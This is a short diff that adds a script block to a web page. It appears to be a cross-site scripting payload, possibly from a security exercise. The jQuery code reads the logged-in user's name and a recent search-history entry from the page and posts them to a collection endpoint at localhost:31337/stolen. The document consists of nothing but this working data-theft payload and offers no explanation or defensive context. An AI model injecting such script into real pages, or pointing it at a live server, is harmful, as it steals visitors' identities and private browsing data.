@@ -1,0 +1,8 @@
+<script>
+$(document).ready(function() {
+	let username = $('#logged-in-user').html();
+	let recentSearch = $($('.history-item')[1]).html();
+	$.post('http://localhost:31337/stolen', { username: username, search: recentSearch });
+})
+</script>
+
